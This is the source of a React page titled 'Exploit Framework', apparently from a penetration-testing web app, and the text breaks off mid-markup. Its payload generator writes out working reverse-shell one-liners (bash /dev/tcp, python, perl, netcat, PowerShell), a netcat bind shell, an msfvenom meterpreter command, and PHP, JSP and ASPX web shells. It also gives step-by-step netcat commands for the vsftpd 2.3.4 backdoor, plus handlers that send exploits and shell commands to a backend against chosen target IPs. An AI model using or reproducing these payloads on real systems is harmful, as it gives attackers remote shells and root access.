import React, { useState, useEffect, useRef } from 'react';
import { useAuthStore } from '../store/authStore';
import { useExploitStore, ShellSession } from '../store/exploitStore';
import { Vulnerability } from '../store/scanStore';
import { assetService, Asset } from '../services/assetService';
import { useNavigate } from 'react-router-dom';

interface ExploitModule {
  id: string;
  name: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard';
  payload_type: 'reverse_shell' | 'bind_shell' | 'meterpreter' | 'web_shell' | 'custom';
  payload_variant?: 'bash' | 'python' | 'perl' | 'netcat' | 'powershell' | 'php' | 'jsp' | 'aspx';
  target_service?: string;
  target_port?: number;
  vulnerability?: Vulnerability;
}

const Exploit: React.FC = () => {
  const { token } = useAuthStore();
  const { 
    sessions: shellSessions, 
    activeSessionId: activeSession, 
    addSession, 
    removeSession, 
    setActiveSession, 
    updateSessionStatus,
    incrementCommandCount
  } = useExploitStore();
  const navigate = useNavigate();
  const [assets, setAssets] = useState<Asset[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedAsset, setSelectedAsset] = useState<Asset | null>(null);
  
  // Asset filtering - initialize from localStorage
  const [assetFilter, setAssetFilter] = useState<'all' | 'scanned' | 'unscanned'>(() => {
    const saved = localStorage.getItem('exploit_assetFilter');
    return (saved as 'all' | 'scanned' | 'unscanned') || 'all';
  });
  const [ipFilter, setIpFilter] = useState(() => localStorage.getItem('exploit_ipFilter') || '');
  const [manualIP, setManualIP] = useState('');
  const [showManualIPInput, setShowManualIPInput] = useState(false);
  
  // Exploit builder state
  const [exploitName, setExploitName] = useState('');
  const [exploitDescription, setExploitDescription] = useState('');
  const [payloadType, setPayloadType] = useState<'reverse_shell' | 'bind_shell' | 'meterpreter' | 'web_shell' | 'custom'>('reverse_shell');
  const [payloadVariant, setPayloadVariant] = useState<'bash' | 'python' | 'perl' | 'netcat' | 'powershell' | 'php' | 'jsp' | 'aspx'>('bash');
  const [targetService, setTargetService] = useState('');
  const [targetPort, setTargetPort] = useState('');
  const [listenerIP, setListenerIP] = useState('');
  const [listenerPort, setListenerPort] = useState('4444');
  const [customPayload, setCustomPayload] = useState('');
  
  // Shell console state - using exploit store
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState<string[]>([]);
  const terminalEndRef = useRef<HTMLDivElement>(null);
  
  // View state
  const [activeTab, setActiveTab] = useState<'assets' | 'console'>('assets');
  const [showBuilderPanel, setShowBuilderPanel] = useState(false);
  const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);

  // Persist filters to localStorage
  useEffect(() => {
    localStorage.setItem('exploit_assetFilter', assetFilter);
  }, [assetFilter]);

  useEffect(() => {
    localStorage.setItem('exploit_ipFilter', ipFilter);
  }, [ipFilter]);

  useEffect(() => {
    fetchAllAssets();
  }, [token]);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [output]);

  const fetchAllAssets = async () => {
    if (!token) return;
    setLoading(true);
    try {
      const allAssets = await assetService.getAssets(token);
      // Show all assets (both scanned and unscanned)
      setAssets(allAssets);
    } catch (error) {
      console.error('Failed to fetch assets:', error);
    } finally {
      setLoading(false);
    }
  };

  const getFilteredAssets = () => {
    let filtered = assets;
    
    // Filter by scan status
    if (assetFilter === 'scanned') {
      filtered = filtered.filter(asset => asset.open_ports && asset.open_ports.length > 0);
    } else if (assetFilter === 'unscanned') {
      filtered = filtered.filter(asset => !asset.open_ports || asset.open_ports.length === 0);
    }
    
    // Filter by IP address
    if (ipFilter.trim()) {
      filtered = filtered.filter(asset => 
        asset.ip_address.toLowerCase().includes(ipFilter.toLowerCase().trim()) ||
        (asset.hostname && asset.hostname.toLowerCase().includes(ipFilter.toLowerCase().trim()))
      );
    }
    
    return filtered;
  };

  const addManualIP = () => {
    if (!manualIP.trim()) return;
    
    // Check if IP already exists
    const exists = assets.find(a => a.ip_address === manualIP.trim());
    if (exists) {
      setSelectedAsset(exists);
      setManualIP('');
      setShowManualIPInput(false);
      return;
    }
    
    // Create a new asset entry
    const newAsset: Asset = {
      id: `manual-${Date.now()}`,
      ip_address: manualIP.trim(),
      hostname: undefined,
      asset_type: 'unknown',
      status: 'unknown',
      last_seen: new Date().toISOString(),
      discovery_method: 'manual',
      open_ports: []
    };
    
    setAssets([newAsset, ...assets]);
    setSelectedAsset(newAsset);
    setManualIP('');
    setShowManualIPInput(false);
  };



  // Get exploit-specific configuration based on CVE
  const getExploitConfig = () => {
    if (!selectedVulnerability) return null;
    
    const cve = selectedVulnerability.cve_id;
    
    // Known exploit configurations
    const exploitConfigs: Record<string, {
      name: string;
      type: string;
      description: string;
      targetPort: number;
      shellPort?: number;
      method: string;
      params: { name: string; value: string; editable: boolean }[];
    }> = {
      'CVE-2011-2523': {
        name: 'vsftpd 2.3.4 Backdoor',
        type: 'vsftpd_backdoor',
        description: 'Backdoor in vsftpd 2.3.4 that opens root shell on port 6200 when triggered by USER containing ":)"',
        targetPort: 21,
        shellPort: 6200,
        method: 'Connect to FTP (21), send "USER backdoor:)", backdoor opens on port 6200',
        params: [
          { name: 'RHOSTS', value: selectedAsset?.ip_address || '', editable: false },
          { name: 'RPORT', value: '21', editable: false },
          { name: 'BACKDOOR_PORT', value: '6200', editable: false }
        ]
      }
    };
    
    return exploitConfigs[cve] || {
      name: `Exploit for ${cve}`,
      type: 'generic',
      description: selectedVulnerability.description || 'No description available',
      targetPort: selectedVulnerability.affected_port || 0,
      method: 'Manual exploitation required',
      params: [
        { name: 'RHOSTS', value: selectedAsset?.ip_address || '', editable: false },
        { name: 'RPORT', value: String(selectedVulnerability.affected_port || 0), editable: true }
      ]
    };
  };

  const generatePayload = () => {
    const config = getExploitConfig();
    
    if (config?.type === 'vsftpd_backdoor') {
      return `# vsftpd 2.3.4 Backdoor Exploit
# Target: ${selectedAsset?.ip_address}:21
# Shell opens on port 6200 after trigger

1. Connect to FTP port 21
2. Send: USER backdoor:)
3. Send: PASS anything  
4. Connect to port 6200 for root shell

# Equivalent netcat commands:
echo -e "USER backdoor:)\\r\\nPASS x\\r\\n" | nc ${selectedAsset?.ip_address} 21
nc ${selectedAsset?.ip_address} 6200`;
    }
    
    let payload = '';
    
    if (payloadType === 'custom') {
      return customPayload;
    }
    
    if (payloadType === 'reverse_shell') {
      switch (payloadVariant) {
        case 'bash':
          payload = `bash -i >& /dev/tcp/${listenerIP}/${listenerPort} 0>&1`;
          break;
        case 'python':
          payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${listenerIP}",${listenerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
          break;
        case 'perl':
          payload = `perl -e 'use Socket;$i="${listenerIP}";$p=${listenerPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
          break;
        case 'netcat':
          payload = `nc -e /bin/sh ${listenerIP} ${listenerPort}`;
          break;
        case 'powershell':
          payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${listenerIP}",${listenerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
          break;
      }
    } else if (payloadType === 'bind_shell') {
      payload = `nc -lvp ${listenerPort} -e /bin/bash`;
    } else if (payloadType === 'meterpreter') {
      payload = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${listenerIP} LPORT=${listenerPort} -f elf > payload.elf`;
    } else if (payloadType === 'web_shell') {
      switch (payloadVariant) {
        case 'php':
          payload = `<?php system($_GET['cmd']); ?>`;
          break;
        case 'jsp':
          payload = `<%@ page import="java.io.*" %>\n<% String cmd = request.getParameter("cmd");\n   Process p = Runtime.getRuntime().exec(cmd);\n   OutputStream os = p.getOutputStream();\n   InputStream in = p.getInputStream(); %>`;
          break;
        case 'aspx':
          payload = `<%@ Page Language="C#" %>\n<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>`;
          break;
      }
    }
    
    return payload;
  };



  const handleBuildExploit = () => {
    const config = getExploitConfig();
    const payload = generatePayload();
    const vulnInfo = selectedVulnerability 
      ? [`[*] Target Vulnerability: ${selectedVulnerability.cve_id}`, `[*] CVSS Score: ${selectedVulnerability.cvss_score}/10`]
      : [];
    
    if (config && config.type !== 'generic') {
      setOutput([
        '[+] Exploit Module Loaded',
        `[*] Name: ${config.name}`,
        `[*] Type: ${config.type}`,
        `[*] Target: ${selectedAsset?.ip_address || 'Not selected'}:${config.targetPort}`,
        ...vulnInfo,
        `[*] Method: ${config.method}`,
        config.shellPort ? `[*] Shell Port: ${config.shellPort}` : '',
        '',
        '[*] Exploit Details:',
        payload,
        '',
        '[!] Ready to execute. Click Execute or use the Console tab.'
      ].filter(Boolean));
    } else {
      setOutput([
        '[+] Exploit Module Built Successfully',
        `[*] Name: ${exploitName || 'Custom Exploit'}`,
        `[*] Target: ${selectedAsset?.ip_address || 'Not selected'}`,
        ...vulnInfo,
        `[*] Payload Type: ${payloadType}${payloadVariant ? ` (${payloadVariant})` : ''}`,
        `[*] Generated Payload:`,
        payload,
        '[!] Ready to execute. Use the Console tab to deploy.'
      ]);
    }
    setActiveTab('console');
  };

  const handleExecutePayload = async () => {
    if (!selectedAsset) {
      setOutput(prev => [...prev, '[!] ERROR: No target selected']);
      return;
    }

    const config = getExploitConfig();
    const exploitType = config?.type || 'generic';
    const port = config?.targetPort || parseInt(targetPort) || 21;
    
    const newSession: ShellSession = {
      id: Math.random().toString(36).substring(7),
      target_ip: selectedAsset.ip_address,
      target_port: config?.shellPort || port,
      status: 'connecting',
      type: 'bind', // Backdoor exploits are bind-type
      created_at: new Date(),
      commands_executed: 0,
      uptime: 0
    };

    addSession(newSession);
    
    const vulnInfo = selectedVulnerability 
      ? [`[*] Exploiting vulnerability: ${selectedVulnerability.cve_id}`]
      : [];
    
    setOutput(prev => [
      ...prev,
      `[*] Initializing ${config?.name || 'exploit'} against ${selectedAsset.ip_address}:${port}`,
      ...vulnInfo,
      config?.method ? `[*] Method: ${config.method}` : '',
      '[*] Sending exploit payload...',
      '[*] Waiting for connection...'
    ].filter(Boolean));

    // Real exploit execution via backend API
    try {
      const response = await fetch('/api/v1/vulnerabilities/exploit/execute', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          target_ip: selectedAsset.ip_address,
          target_port: port,
          exploit_type: exploitType
        })
      });

      const result = await response.json();

      if (result.success) {
        updateSessionStatus(newSession.id, 'connected');
        setOutput(prev => [
          ...prev,
          `[+] Exploit successful!`,
          `[+] Shell session ${newSession.id} opened on port ${result.shell_port || config?.shellPort || port}`,
          `[+] Connected to ${selectedAsset.ip_address}`,
          `[*] Initial output:`,
          result.output,
          `[*] You now have root shell access. Type commands below...`
        ]);
      } else {
        updateSessionStatus(newSession.id, 'failed');
        setOutput(prev => [
          ...prev,
          `[-] Exploit failed: ${result.output}`,
          `[*] Try a different exploit or verify the target is vulnerable`
        ]);
      }
    } catch (error: any) {
      updateSessionStatus(newSession.id, 'failed');
      setOutput(prev => [
        ...prev,
        `[-] Connection error: ${error.message}`,
        `[*] Check that the target is reachable`
      ]);
    }
  };

  const handleSendCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim() || !activeSession) return;

    const currentCommand = command;
    const session = shellSessions.find(s => s.id === activeSession);
    if (session) {
      incrementCommandCount(activeSession);
    }
    
    setCommand('');
    setOutput(prev => [...prev, `root@${selectedAsset?.hostname || selectedAsset?.ip_address}:~# ${currentCommand}`]);

    // Real command execution via backend API
    try {
      const response = await fetch('/api/v1/vulnerabilities/exploit/execute', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          target_ip: session?.target_ip || selectedAsset?.ip_address,
          target_port: 21,
          exploit_type: 'shell_command',
          command: currentCommand
        })
      });

      const result = await response.json();
      
      if (result.success) {
        setOutput(prev => [...prev, result.output]);
      } else {
        setOutput(prev => [...prev, `[-] Error: ${result.output}`]);
      }
    } catch (error: any) {
      setOutput(prev => [...prev, `[-] Command execution failed: ${error.message}`]);
    }
  };

  const handleCloseSession = (sessionId: string) => {
    removeSession(sessionId);
    setOutput(prev => [...prev, `[*] Session ${sessionId} closed`]);
  };

  const getVulnerabilityCount = (asset: Asset) => {
    // In real implementation, this would check the vulnerabilities table
    return asset.open_ports?.length || 0;
  };

  const getSeverityColor = (severity: string) => {
    const colors = {
      'critical': 'border-red-600 text-red-500 bg-red-500',
      'high': 'border-orange-500 text-orange-400 bg-orange-500',
      'medium': 'border-yellow-500 text-yellow-400 bg-yellow-500',
      'low': 'border-blue-500 text-blue-400 bg-blue-500'
    };
    return colors[severity as keyof typeof colors] || colors.low;
  };

  const getServiceIcon = (service: string) => {
    const icons: { [key: string]: string } = {
      'ssh': 'â—ˆ',
      'http': 'â—‰',
      'https': 'â—‰',
      'ftp': 'â¬¢',
      'telnet': 'â—†',
      'rdp': 'â¬¡',
      'vnc': 'â—ˆ',
      'mysql': 'â¬¢',
      'postgresql': 'â—‰',
      'smb': 'â—†'
    };
    return icons[service.toLowerCase()] || 'â—ˆ';
  };

  const getSessionUptime = (session: ShellSession) => {
    const now = new Date();
    const diff = Math.floor((now.getTime() - session.created_at.getTime()) / 1000);
    const minutes = Math.floor(diff / 60);
    const seconds = diff % 60;
    return `${minutes}m ${seconds}s`;
  };

  return (
    <div className="h-full flex flex-col space-y-4 relative">
      {/* Header */}
      <div className="flex justify-between items-center">
        <div>
          <h2 className="text-2xl font-bold text-cyber-red uppercase tracking-wider cyber-glow-red flex items-center">
            <span className="mr-3 text-3xl">â—†</span>
            Exploit Framework
          </h2>
          <p className="text-cyber-gray-light text-sm mt-1">Build and execute exploits against vulnerable targets</p>
        </div>
        <div className="flex space-x-2">
          <button
            onClick={() => setActiveTab('assets')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'assets' ? 'border-cyber-red text-cyber-red bg-cyber-red bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-red hover:text-cyber-red'}`}
          >
            <span className="text-lg mr-1">â—‰</span> Targets
          </button>
          <button
            onClick={() => setActiveTab('console')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'console' ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-green hover:text-cyber-green'}`}
          >
            <span className="text-lg mr-1">â–¶</span> Console
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 bg-cyber-darker border border-cyber-gray rounded-lg overflow-hidden">
        {/* Assets Tab */}
        {activeTab === 'assets' && (
          <div className="h-full flex flex-col">
            <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-cyber-blue font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">â—ˆ</span>
                  Targets ({getFilteredAssets().length})
                </h3>
                <div className="flex space-x-2">
                  <button
                    onClick={() => setAssetFilter('all')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'all' ? 'border-cyber-blue text-cyber-blue bg-cyber-blue bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-blue'}`}
                  >
                    All
                  </button>
                  <button
                    onClick={() => setAssetFilter('scanned')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'scanned' ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-green'}`}
                  >
                    Scanned
                  </button>
                  <button
                    onClick={() => setAssetFilter('unscanned')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'unscanned' ? 'border-cyber-purple text-cyber-purple bg-cyber-purple bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-purple'}`}
                  >
                    Unscanned
                  </button>
                </div>
              </div>
              
              {/* Navigation to Scans Page */}
              <div className="mb-4 p-3 bg-cyber-darker border border-cyber-blue rounded">
                <p className="text-xs text-cyber-blue">
                  <span className="mr-2">â„¹</span>
                  <strong>Looking for vulnerability scanning?</strong> Use the{' '}
                  <button
                    onClick={() => navigate('/scans')}
                    className="text-cyber-purple hover:text-cyber-red underline font-bold"
                  >
                    Scans page
                  </button>
                  {' '}to scan for vulnerabilities, then return here to build exploits.
                </p>
              </div>
              
              {/* IP Filter and Scan Controls Row */}
              <div className="flex items-center space-x-2">
                <div className="flex-1 relative">
                  <input
                    type="text"
                    value={ipFilter}
                    onChange={(e) => setIpFilter(e.target.value)}
                    placeholder="Filter by IP or hostname..."
                    className="w-full px-3 py-2 bg-cyber-darker border border-cyber-gray rounded text-white text-sm focus:outline-none focus:border-cyber-blue placeholder-cyber-gray"
                  />
                  {ipFilter && (
                    <button
                      onClick={() => setIpFilter('')}
                      className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cyber-gray hover:text-cyber-red"
                    >
                      âœ•
                    </button>
                  )}
                </div>
                <button
                  onClick={() => setShowManualIPInput(!showManualIPInput)}
                  className="btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black px-4 py-2 text-sm font-bold whitespace-nowrap"
                >
                  âŠž Add IP
                </button>
              </div>

              {/* Manual IP Entry */}
              {showManualIPInput && (
                <div className="mt-3 p-3 bg-cyber-darker border border-cyber-purple rounded">
                  <div className="flex items-center space-x-2">
                    <input
                      type="text"
                      value={manualIP}
                      onChange={(e) => setManualIP(e.target.value)}
                      onKeyPress={(e) => e.key === 'Enter' && addManualIP()}
                      placeholder="e.g., 172.21.0.42"
                      className="flex-1 px-3 py-2 bg-cyber-dark border border-cyber-gray rounded text-white text-sm focus:outline-none focus:border-cyber-purple placeholder-cyber-gray font-mono"
                      autoFocus
                    />
                    <button
                      onClick={addManualIP}
                      className="btn-cyber border-cyber-green text-cyber-green hover:bg-cyber-green hover:text-black px-4 py-2 text-sm font-bold"
                    >
                      Add
                    </button>
                    <button
                      onClick={() => {
                        setShowManualIPInput(false);
                        setManualIP('');
                      }}
                      className="btn-cyber border-cyber-gray text-cyber-gray hover:border-cyber-red hover:text-cyber-red px-4 py-2 text-sm"
                    >
                      Cancel
                    </button>
                  </div>
                </div>
              )}
            </div>
            
            <div className="flex-1 overflow-auto">
              {loading ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-cyber-blue animate-pulse text-xs">Loading targets...</div>
                </div>
              ) : getFilteredAssets().length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-4xl mb-2 opacity-20">â—ˆ</div>
                    <p className="text-cyber-gray-light text-xs">No {assetFilter === 'all' ? '' : assetFilter} targets found</p>
                  </div>
                </div>
              ) : (
                <div className="divide-y divide-cyber-gray">
                  {getFilteredAssets().map(asset => (
                    <div
                      key={asset.id}
                      onClick={() => setSelectedAsset(asset)}
                      className={`p-4 cursor-pointer transition-all ${
                        selectedAsset?.id === asset.id
                          ? 'bg-cyber-darker border-l-4 border-cyber-red'
                          : 'border-l-2 border-transparent hover:bg-cyber-dark hover:border-cyber-purple'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex-1">
                          <div className="flex items-center space-x-2 mb-1">
                            <h4 className="text-cyber-blue font-bold text-sm font-mono">{asset.ip_address}</h4>
                            {asset.hostname && asset.hostname !== asset.ip_address && (
                              <span className="text-cyber-gray-light text-xs">{asset.hostname}</span>
                            )}
                            {asset.open_ports && asset.open_ports.length > 0 && (
                              <span className="px-1.5 py-0.5 text-xs border border-cyber-green text-cyber-green rounded">
                                Scanned
                              </span>
                            )}
                          </div>
                          
                          <div className="flex items-center space-x-4 text-xs">
                            <span className="text-cyber-gray-light">OS: <span className="text-cyber-green">{asset.os_name || 'Unknown'}</span></span>
                            <span className="text-cyber-gray-light">Ports: <span className="text-cyber-purple font-bold">{asset.open_ports?.length || 0}</span></span>
                            {asset.services && Object.keys(asset.services).length > 0 && (
                              <div className="flex gap-1">
                                {Object.keys(asset.services).slice(0, 6).map(port => (
                                  <span
                                    key={port}
                                    className="px-2 py-0.5 bg-cyber-darker border border-cyber-blue text-cyber-blue rounded text-xs"
                                    title={`${asset.services?.[port]?.service || 'Unknown'} on port ${port}`}
                                  >
                                    {getServiceIcon(asset.services?.[port]?.service || '')} {port}
                                  </span>
                                ))}
                                {Object.keys(asset.services).length > 6 && (
                                  <span className="text-cyber-gray text-xs">+{Object.keys(asset.services).length - 6}</span>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                        
                        <div className="flex items-center space-x-2">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedAsset(asset);
                              setShowBuilderPanel(true);
                            }}
                            className="btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black px-3 py-1 text-xs font-bold"
                          >
                            â—† Build
                          </button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Console Tab */}
        {activeTab === 'console' && (
          <div className="h-full flex flex-col overflow-hidden">
            {/* Fixed Header with Session Tabs */}
            <div className="flex-shrink-0 p-4 border-b border-cyber-gray bg-cyber-dark">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-cyber-green font-bold uppercase text-sm flex items-center">
                    <span className="mr-2">â–£</span>
                    Shell Console
                  </h3>
                  {activeSession && (() => {
                    const session = shellSessions.find(s => s.id === activeSession);
                    return session ? (
                      <div className="flex items-center space-x-4 text-xs mt-2">
                        <span className="text-cyber-blue">
                          Session: {session.target_ip}:{session.target_port}
                        </span>
                        <span className="text-cyber-gray-light">
                          Commands: {session.commands_executed}
                        </span>
                        <span className="text-cyber-gray-light">
                          Status: <span className={session.status === 'connected' ? 'text-cyber-green' : 'text-cyber-red'}>
                            {session.status.toUpperCase()}
                          </span>
                        </span>
                      </div>
                    ) : null;
                  })()}
                </div>
                
                {/* Session Tabs */}
                {shellSessions.length > 0 && (
                  <div className="flex items-center space-x-2">
                    {shellSessions.map(session => (
                    <div
                      key={session.id}
                      className={`flex items-center space-x-2 px-3 py-1 border rounded cursor-pointer ${
                        activeSession === session.id
                          ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10'
                          : 'border-cyber-gray text-cyber-gray hover:border-cyber-green'
                      }`}
                      onClick={() => setActiveSession(session.id)}
                    >
                      <span className={`w-2 h-2 rounded-full ${
                        session.status === 'connected' ? 'bg-cyber-green animate-pulse' :
                        session.status === 'connecting' ? 'bg-cyber-blue animate-pulse' :
                        session.status === 'failed' ? 'bg-cyber-red' :
                        'bg-cyber-gray'
                      }`} />
                      <span className="text-xs font-mono">{session.target_ip}</span>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleCloseSession(session.id);
                        }}
                        className="text-cyber-red hover:text-white ml-1"
                      >
                        Ã—
                      </button>
                    </div>
                  ))}
                </div>
              )}
              </div>
            </div>
            
            {/* Scrollable Console Area */}
            <div className="flex-1 flex flex-col bg-black text-green-500 font-mono p-4 text-sm overflow-hidden">
              {shellSessions.length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-6xl mb-4 opacity-20">ðŸ’»</div>
                    <p className="text-cyber-gray-light">No active shell sessions</p>
                    <p className="text-xs text-cyber-gray mt-2">Execute a payload to start a session</p>
                  </div>
                </div>
              ) : (
                <>
                  <div className="flex-1 overflow-auto custom-scrollbar mb-4 space-y-1">
                    {output.map((line, i) => (
                      <div key={i} className="whitespace-pre-wrap break-all">
                        {line.startsWith('[+]') && <span className="text-cyber-green">{line}</span>}
                        {line.startsWith('[*]') && <span className="text-cyber-blue">{line}</span>}
                        {line.startsWith('[!]') && <span className="text-cyber-red">{line}</span>}
                        {!line.startsWith('[') && line}
                      </div>
                    ))}
                    <div ref={terminalEndRef} />
                  </div>
                  
                  {activeSession && shellSessions.find(s => s.id === activeSession)?.status === 'connected' && (
                    <form onSubmit={handleSendCommand} className="flex items-center space-x-2 border-t border-cyber-gray pt-4">
                      <span className="text-cyber-red font-bold">#</span>
                      <input
                        type="text"
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        className="flex-1 bg-transparent border-none outline-none text-green-500"
                        placeholder="Enter command..."
                        autoFocus
                      />
                    </form>
                  )}
                </>
              )}
            </div>
          </div>
        )}
      </div>

      {/* Right-Side Sliding Builder Panel */}
      {showBuilderPanel && (
        <>
          {/* Overlay */}
          <div 
            className="fixed inset-0 bg-black bg-opacity-50 z-40"
            onClick={() => setShowBuilderPanel(false)}
          />
          
          {/* Sliding Panel */}
          <div className="fixed right-0 top-0 h-full w-full md:w-3/5 lg:w-2/5 bg-cyber-darker border-l border-cyber-purple z-50 overflow-y-auto animate-slideIn">
            {/* Panel Header */}
            <div className="sticky top-0 bg-cyber-dark border-b border-cyber-purple p-4 flex items-center justify-between z-10">
              <div>
                <h3 className="text-cyber-purple font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">â—ˆ</span>
                  Exploit Module Builder
                </h3>
                {selectedAsset && (
                  <p className="text-xs text-cyber-blue mt-1">
                    Target: {selectedAsset.ip_address} ({selectedAsset.hostname || 'Unknown'})
                  </p>
                )}
              </div>
              <button
                onClick={() => setShowBuilderPanel(false)}
                className="text-cyber-gray hover:text-cyber-red text-2xl leading-none"
              >
                Ã—
              </button>
            </div>

            {/* Panel Content - Builder Form */}
            <div className="p-4">
              {!selectedAsset ? (
                <div className="flex items-center justify-center h-48">
                  <div className="text-center">
                    <div className="text-4xl mb-2 opacity-20">â—ˆ</div>
                    <p className="text-cyber-gray-light text-sm">No target selected</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-3">
                  {/* Vulnerability Info (if selected) */}
                  {selectedVulnerability && (
                    <div className="bg-cyber-dark border border-cyber-red rounded p-3">
                      <div className="flex items-center space-x-2 mb-1">
                        <span className={`px-2 py-0.5 text-xs font-bold border rounded ${getSeverityColor(selectedVulnerability.severity)}`}>
                          {selectedVulnerability.severity.toUpperCase()}
                        </span>
                        <span className="text-cyber-blue font-mono text-xs">{selectedVulnerability.cve_id}</span>
                      </div>
                      <p className="text-white font-semibold text-sm">{selectedVulnerability.title}</p>
                    </div>
                  )}

                  {/* Exploit Configuration - Dynamic based on vulnerability */}
                  {(() => {
                    const config = getExploitConfig();
                    if (config && config.type !== 'generic') {
                      // Known exploit - show specific configuration
                      return (
                        <>
                          <div className="bg-cyber-dark border border-cyber-green rounded p-3">
                            <h4 className="text-cyber-green font-bold uppercase mb-2 text-xs">Exploit Module</h4>
                            <div className="space-y-2">
                              <div className="flex justify-between text-sm">
                                <span className="text-cyber-gray-light">Name:</span>
                                <span className="text-white font-mono">{config.name}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-cyber-gray-light">Type:</span>
                                <span className="text-cyber-blue font-mono">{config.type}</span>
                              </div>
                              <p className="text-cyber-gray-light text-xs mt-2">{config.description}</p>
                            </div>
                          </div>

                          <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                            <h4 className="text-cyber-purple font-bold uppercase mb-2 text-xs">Parameters</h4>
                            <div className="space-y-2">
                              {config.params.map((param, idx) => (
                                <div key={idx} className="flex items-center space-x-2">
                                  <span className="text-cyber-blue font-mono text-xs w-32">{param.name}:</span>
                                  <input
                                    type="text"
                                    value={param.value}
                                    disabled={!param.editable}
                                    className="flex-1 bg-cyber-darker border border-cyber-gray rounded px-2 py-1 text-white text-sm font-mono disabled:opacity-60"
                                  />
                                </div>
                              ))}
                              {config.shellPort && (
                                <div className="flex items-center space-x-2">
                                  <span className="text-cyber-blue font-mono text-xs w-32">SHELL_PORT:</span>
                                  <input
                                    type="text"
                                    value={config.shellPort}
                                    disabled
                                    className="flex-1 bg-cyber-darker border border-cyber-gray rounded px-2 py-1 text-cyber-green text-sm font-mono disabled:opacity-60"
                                  />
                                </div>
                              )}
                            </div>
                          </div>

                          <div className="bg-cyber-darker border border-cyber-blue rounded p-2">
                            <h4 className="text-cyber-blue font-bold uppercase mb-1 text-xs">Method</h4>
                            <p className="text-cyber-green text-xs font-mono">{config.method}</p>
                          </div>
                        </>
                      );
                    } else {
                      // Generic/unknown exploit - show payload builder
                      return (
                        <>
                          <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                            <h4 className="text-cyber-blue font-bold uppercase mb-2 text-xs">Exploit Details</h4>
                            <div className="space-y-2">
                              <input
                                type="text"
                                value={exploitName}
                                onChange={(e) => setExploitName(e.target.value)}
                                className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-purple outline-none"
                                placeholder="Exploit name"
                              />
                              <textarea
                                value={exploitDescription}
                                onChange={(e) => setExploitDescription(e.target.value)}
                                className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-purple outline-none"
                                rows={2}
                                placeholder="Description"
                              />
                            </div>
                          </div>

                          {/* Payload Configuration */}
                          <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                            <h4 className="text-cyber-green font-bold uppercase mb-2 text-xs">Payload</h4>
                            <div className="space-y-2">
                              <select
                                value={payloadType}
